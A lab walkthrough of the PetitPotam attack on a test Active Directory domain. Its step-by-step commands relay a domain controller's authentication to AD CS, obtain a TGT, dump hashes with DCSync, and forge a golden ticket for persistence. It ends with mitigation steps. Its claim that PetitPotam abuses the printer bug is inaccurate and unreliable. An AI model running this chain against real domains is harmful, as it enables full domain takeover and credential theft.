# Introduction & Attack Anatomy

![Petit-Potam-Flow-Diagram](/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg)

- The **PetitPotam attack** is a technique where we abuse the **printer bug** (Explained here: https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug) to make a **domain controller** authenticate to our **kali machine**.
- *Relaying the captured authentication* to the **web interface of AD Certificate services (ADCS)** allows us to get the **certificate of the domain controller's computer account**.
- *Having this certificate* can let us **request a TGT for the computer account**.
- *And, with a TGT of a Domain Controller's machine account,* we can abuse its **DCSync** right on the domain to retrieve **a full dump containing all domain users' NTLM hashes**.
- *Having all user hashes and using them with a simple Pass-the-Hash attack,* we can obtain **code execution as a Domain Admin**.
- **Persistence** can also be established with a **Golden Ticket** since the `krbtgt` account hash would be obtainable.

---

# Tools needed
1. **Impacket** (https://github.com/SecureAuthCorp/impacket)
2. **PetitPotam** (https://github.com/topotam/PetitPotam)
3. **Rubeus** (https://github.com/GhostPack/Rubeus)
4. **Mimikatz** (https://github.com/gentilkiwi/mimikatz)

---

# Lab Setup and Conditions
## 1. DC.lab.local (192.168.126.129)
A Domain Controller with **Active Directory Certificate Services Web Enrollment** enabled

![Domain-Controllers](/assets/petitpotam/Domain-Controllers.jpg)

![AD-CS-Installed](/assets/petitpotam/AD-CS-Installed.jpg)

## 2. DC2.lab.local (192.168.126.130)
Another Domain Controller (*PrintSpooler Service must be running to quickly force authentication.*)

![Spooler-Running](/assets/petitpotam/Spooler-Running.jpg)

## 3. Kali Machine (192.168.126.132)
for triggering authentication and relaying to ADCS Web UI.

![kali-ip-config](/assets/petitpotam/kali-ip-config.jpg)

## 4. Windows Machine (192.168.126.128)
for requesting a TGT and doing the DCSync attack (The machine shouldn't be in the domain, but should have the Domain Controller set as its primary DNS server).

![Windows-Attacker-ipconfig](/assets/petitpotam/Windows-Attacker-ipconfig.jpg)

## 5. normal user account (Lab\JohnSmith)
A regular domain user with no special privileges.

![John-Smith-User](/assets/petitpotam/John-Smith-User.jpg)

---

# Steps to Create
## 1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI
`ntlmrelayx.py -t http://<CA_Server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`

![ntlm-relay-start](/assets/petitpotam/ntlm-relay-start.jpg)

## 2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine
`python3 PetitPotam.py -d <DOMAIN_FQDN> -u <USERNAME> -p <PASSWORD> <KALI> <TARGET_DC>`

![PetitPotam-Launched](/assets/petitpotam/PetitPotam-Launched.jpg)

## 3. Recieve the Base64 certificate for the domain controller's computer account

![got-dc2-cert](/assets/petitpotam/got-dc2-cert.jpg)

## 4. Use Rubeus on the windows machine to request a TGT for that account using the certificate

`.\Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>`

![rubeus-command](/assets/petitpotam/rubeus-command.jpg)

![got-dc2-tgt](/assets/petitpotam/got-dc2-tgt.jpg)

## 5. *Having the TGT in memory,* use Mimikatz to do a DCSync attack
`lsadump::dcsync /domain:<DOMAINFQDN> /user:<TARGET_USER>`

![dcsync-for-domain-admin-hash](/assets/petitpotam/dcsync-for-domain-admin-hash.jpg)

## 6. Grab any domain admin's hash to have code execution

![code-execution-as-administrator](/assets/petitpotam/code-execution-as-administrator.jpg)

## 7. (Optional) Create a Golden Ticket for persistence
Domain SID Lookup: `lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>`

![domain-sid-lookup](/assets/petitpotam/domain-sid-lookup.jpg)

Obtaining the `krbtgt` account's hash: `lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt`

![krbtgt-hash](/assets/petitpotam/krbtgt-hash.jpg)

Golden ticket creation: `ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <CAN_BE_NON_EXISTING_USERNAME>`

![golden-ticket-created](/assets/petitpotam/golden-ticket-created.jpg)

Exporting ticket to the environment: `export KRB5CCNAME=/<CHOSEN_USERNAME>.ccache`

Command execution using ticket: `psexec.py <DOMAIN_FQDN>/<CHOSEN_USERNAME>@<DC_FQDN> -k -no-pass`

![golden-ticket-used](/assets/petitpotam/golden-ticket-used.jpg)

---

# Mitigation:
## 1. Enable EPA for Certificate Authority Web Enrollment
IIS Manager -> Sites -> Default Web Site -> CertSrv -> Authentication -> Windows Authentication -> Right-click -> Advanced Settings -> Extended Protection: Required

![certsrv-epa-required](/assets/petitpotam/certsrv-epa-required.jpg)

## 2. Enable EPA for Certificate Enrollment Web Service
IIS Manager -> Sites -> Default Web Site -> <CA_NAME>\_CES\_Kerberos -> Authentication -> Windows Authentication -> Right-click -> Advanced Settings -> Extended Protection: Required

![certentrollwebsvc-epa-required](/assets/petitpotam/certentrollwebsvc-epa-required.jpg)

After enabling EPA in the UI, the `Web.config` file created by CES role at `<%windir%>\systemdata\CES\<CA Name>_CES_Kerberos\web.config` should also be updated by adding `<extendedProtectionPolicy>` set with a value of `Always`

![web-config-editing](/assets/petitpotam/web-config-editing.jpg)

## 3. Enable Require SSL, which will enable only HTTPS connections.
IIS Manager -> Sites -> Default Web Site -> CertSrv -> SSL Settings -> Require SSL

![cert-srv-require-ssl](/assets/petitpotam/cert-srv-require-ssl.jpg)

## 4. Restart IIS
*From an elevated command prompt,* type: `iisreset /restart`

---

# Conclusion
Having a non-secure AD CS Installation in a domain can present an attacker with an easy way to achieve Domain Admin privileges and gain Persistence.
Luckily enough, with some simple mitigation steps, this can be resolved.

---

# Credits
1. **Will Schroeder** and **Lee Christensen** who wrote this excellent paper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
2. **Lionel Gilles** for creating the **PetitPotam** Python Script
3. **Yang Zhang** of Back2Zero team & **Yongtao Wang** (@Sanr) of BCM Social Corp, **Eyal Karni, Marina Simakov and Yaron Zinar** from Preempt & **n1nty** from A-TEAM of Legendsec at Qi'anxin Group for the **PrinterBug** (CVE-2019-1040)
4. **SecureAuthCorp** for the awesome **Impacket** scripts
5. **Benjamin Delpy** for the legendary **mimikatz**
6. **GhostPack** for the **Rubeus** tool
7. **Harshit Rajpal** for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)
8. **Microsoft Support** for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)